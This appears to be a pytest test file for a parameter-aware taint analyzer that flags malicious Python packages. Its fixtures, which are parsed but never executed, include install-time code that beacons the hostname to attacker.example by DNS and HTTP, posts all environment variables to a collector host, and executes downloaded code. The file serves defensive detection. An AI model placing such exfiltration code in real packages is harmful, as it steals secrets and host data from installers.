"""
Unit tests for backend/src/dataflow_rules_v4.py (parameter-aware taint).

Run from project root:
    python3 -m pytest backend/tests/test_dataflow_rules_v4.py

All inputs are small synthetic snippets that are parsed, never executed.
"""
from __future__ import annotations

import ast
import sys
import textwrap
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parent.parent / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

import dataflow_rules as v3  # noqa: E402
import dataflow_rules_v4 as v4  # noqa: E402


@pytest.fixture(autouse=True)
def clear_rate_limits():
    """Override the conftest fixture: these tests don't touch middleware.app."""
    yield


def _mods(files: dict[str, str]) -> list[tuple[str, ast.Module]]:
    return [(rel, ast.parse(textwrap.dedent(src))) for rel, src in files.items()]


def _run(files: dict[str, str], **kw):
    return v4.analyze_package(_mods(files), **kw)


def _rules(found) -> set[str]:
    return {f.rule for _, f in found}


# ── malicious shapes v3 misses ───────────────────────────────────────────────

BEACON_DNS = {"pkg-1.0/setup.py": """
    import socket
    from setuptools import setup

    def _safe_hostname():
        try:
            return socket.gethostname()
        except Exception:
            return "unknown"

    def _dns_callback(host):
        try:
            socket.gethostbyname(f"{host}.cb.attacker.example")
        except Exception:
            pass

    h = _safe_hostname()
    _dns_callback(h)
    setup(name="pkg")
"""}

BEACON_HTTP = {"pkg-1.0/setup.py": """
    import socket
    import requests

    def _safe_hostname():
        return socket.gethostname()

    def _http_callback(host, tag="x"):
        requests.get("https://cb.attacker.example/ping", params={"h": host, "t": tag})

    _http_callback(_safe_hostname())
"""}

ENV_THROUGH_HELPER = {"pkg-1.0/pkg/__init__.py": """
    import os
    import requests

    URL = "https://collector.attacker.example/e"

    def _send_data(data):
        requests.post(URL, data=data)

    _send_data(dict(os.environ))
"""}


def test_beacon_dns_through_param():
    assert v3.analyze_package(_mods(BEACON_DNS)) == []
    found = _run(BEACON_DNS)
    hits = [(rel, f) for rel, f in found if f.rule == "exfil_hostid"]
    assert len(hits) == 1
    rel, f = hits[0]
    assert rel == "pkg-1.0/setup.py"
    assert f.func == "_dns_callback" and f.via == "<module>" and not f.loose
    assert f.origin == "pkg-1.0/setup.py"
    assert f.line == 13  # the gethostbyname line inside the callee


def test_beacon_http_through_param():
    assert "exfil_hostid" not in _rules(v3.analyze_package(_mods(BEACON_HTTP)))
    found = _run(BEACON_HTTP)
    assert [(f.rule, f.func) for _, f in found if f.rule == "exfil_hostid"] == \
        [("exfil_hostid", "_http_callback")]


def test_env_dump_through_helper():
    assert v3.analyze_package(_mods(ENV_THROUGH_HELPER)) == []
    found = _run(ENV_THROUGH_HELPER)
    assert [(f.rule, f.func, f.via) for _, f in found] == [("exfil_env_bulk", "_send_data", "<module>")]


def test_remote_code_through_helper_method_opt_in():
    files = {"p/pkg/core.py": """
        import requests

        class Loader:
            def _apply(self, code):
                exec(code)

            def boot(self):
                body = requests.get("https://x.example/p").text
                self._apply(body)
    """}
    # NET does not cross into parameters by default (dev-tool false positives)
    assert _run(files) == []
    found = _run(files, param_labels=v4.ALL_PARAM_LABELS)
    assert [(f.rule, f.func, f.via) for _, f in found] == [("remote_code_exec", "_apply", "boot")]


def test_cross_module_helper_keeps_install_time_origin():
    files = {
        "p-1/setup.py": """
            import os
            from p.net import push_environment
            push_environment(os.environ.copy())
        """,
        "p-1/p/net.py": """
            import requests
            def push_environment(payload):
                requests.post("https://x.example", json=payload)
        """,
    }
    found = _run(files)
    assert len(found) == 1
    rel, f = found[0]
    assert rel == "p-1/p/net.py" and f.rule == "exfil_env_bulk" and f.origin == "p-1/setup.py"


def test_depth_two_and_bound():
    chain = """
        import os, requests
        def _a(x):
            _b(x)
        def _b(y):
            _c(y)
        def _c(z):
            requests.post("https://x.example", data=z)
        _{start}(dict(os.environ))
    """
    # caller -> _b -> _c is depth 2: found
    found = _run({"p/m.py": chain.format(start="b")})
    assert [(f.func, f.via) for _, f in found] == [("_c", "_b")]
    # caller -> _a -> _b -> _c is depth 3: beyond the bound
    assert _run({"p/m.py": chain.format(start="a")}) == []
    assert _run({"p/m.py": chain.format(start="a")}, max_depth=3) != []


def test_keyword_and_star_binding():
    files = {"p/m.py": """
        import os, requests
        def _ship(url, *, body=None):
            requests.post(url, data=body)
        _ship("https://x.example", body=os.environ.copy())
    """}
    assert _rules(_run(files)) == {"exfil_env_bulk"}


def test_generic_name_same_module_is_loose():
    files = {"p/m.py": """
        import os, requests
        def send(data):
            requests.post("https://x.example", data=data)
        send(dict(os.environ))
    """}
    found = _run(files)
    assert [(f.rule, f.loose) for _, f in found] == [("exfil_env_bulk", True)]
    assert _run(files, local_generic=False) == []


def test_generic_name_imported_or_cross_module_not_resolved():
    imported = {"p/m.py": """
        import os
        from transport import send
        def send(data):
            pass
        send(dict(os.environ))
    """}
    assert _run(imported) == []
    cross = {
        "p/a.py": """
            import os
            from p.b import send
            send(dict(os.environ))
        """,
        "p/b.py": """
            import requests
            def send(data):
                requests.post("https://x.example", data=data)
        """,
    }
    assert _run(cross) == []


def test_duplicate_names_not_resolved():
    files = {
        "p/a.py": """
            import os
            def _push(d):
                pass
            _push(dict(os.environ))
        """,
        "p/b.py": """
            import requests
            def _push(d):
                requests.post("https://x.example", data=d)
        """,
    }
    assert _run(files) == []


# ── benign shapes that must stay clean ───────────────────────────────────────

BINARY_FETCHER = {"tool-1/tool/install.py": """
    import os, stat, tarfile, subprocess, requests

    RELEASE = "https://github.com/org/tool/releases/download/v1.2/tool_linux_amd64.tar.gz"

    def _download(url, dest):
        r = requests.get(url, timeout=30)
        r.raise_for_status()
        with open(dest, "wb") as f:
            f.write(r.content)

    def _extract(archive, outdir):
        with tarfile.open(archive) as t:
            t.extractall(outdir)
        return os.path.join(outdir, "tool")

    def _make_executable(path):
        os.chmod(path, os.stat(path).st_mode | stat.S_IEXEC)

    def ensure_tool(cache):
        archive = os.path.join(cache, "tool.tar.gz")
        _download(RELEASE, archive)
        binary = os.path.join(cache, "tool")
        _extract(archive, cache)
        _make_executable(binary)
        return subprocess.check_output([binary, "--version"])
"""}

API_KEY_SDK = {"sdk-1/sdk/client.py": """
    import os
    import requests

    class Client:
        def __init__(self, api_key=None):
            self.api_key = api_key or os.getenv("ACME_API_KEY")
            self.session = requests.Session()

        def _handle_response(self, resp):
            if resp.status_code >= 400:
                raise RuntimeError(resp.text)
            return resp.json()

        def _log_payload(self, payload, response):
            print(len(str(payload)), response)

        def complete(self, prompt):
            resp = requests.post("https://api.acme.example/v1/complete",
                                 headers={"Authorization": f"Bearer {self.api_key}"},
                                 json={"prompt": prompt})
            data = self._handle_response(resp)
            self._log_payload({"prompt": prompt}, data)
            return data
"""}

LAN_IP = {"lan-1/lan/__init__.py": """
    import socket
    import requests

    def _resolve(name):
        return socket.gethostbyname(name)

    def _lookup(host, port=0):
        return socket.getaddrinfo(host, port)

    def _register(ip, url="https://hub.local.example/register"):
        requests.post(url, json={"ip": ip})

    def local_ip():
        ip = _resolve(socket.gethostname())
        _lookup(socket.gethostname())
        return ip
"""}


@pytest.mark.parametrize("files", [BINARY_FETCHER, API_KEY_SDK, LAN_IP],
                         ids=["binary_fetcher", "api_key_sdk", "lan_ip"])
def test_benign_stays_clean(files):
    assert v3.analyze_package(_mods(files)) == []
    assert _run(files) == []


@pytest.mark.parametrize("files", [BEACON_DNS, BEACON_HTTP, ENV_THROUGH_HELPER,
                                   BINARY_FETCHER, API_KEY_SDK, LAN_IP])
def test_depth_zero_matches_v3(files):
    old = [(rel, f.rule, f.func, f.line) for rel, f in v3.analyze_package(_mods(files))]
    new = [(rel, f.rule, f.func, f.line) for rel, f in _run(files, max_depth=0)]
    assert old == new


def test_self_updater_response_into_subprocess_helper_clean_by_default():
    files = {"cli-1/cli/update.py": """
        import subprocess, sys, requests

        def _pip_install(spec):
            subprocess.run([sys.executable, "-m", "pip", "install", spec], check=False)

        def maybe_update():
            latest = requests.get("https://pypi.org/pypi/cli/json").json()["info"]["version"]
            _pip_install(f"cli=={latest}")
    """}
    assert _run(files) == []
    assert _rules(_run(files, param_labels=v4.ALL_PARAM_LABELS)) == {"remote_cmd_exec"}
